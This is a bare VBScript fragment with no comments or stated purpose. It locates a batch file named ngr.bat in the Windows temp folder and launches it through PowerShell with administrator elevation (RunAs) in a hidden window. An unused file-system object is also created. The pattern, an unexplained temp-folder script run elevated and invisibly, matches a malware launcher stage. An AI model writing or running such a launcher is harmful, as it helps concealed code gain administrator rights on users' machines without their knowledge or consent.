Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
tempPath = shell.ExpandEnvironmentStrings("%TEMP%")
target = tempPath & "\ngr.bat"

shell.Run "powershell.exe -Command Start-Process '" & target & "' -Verb RunAs", 0, False
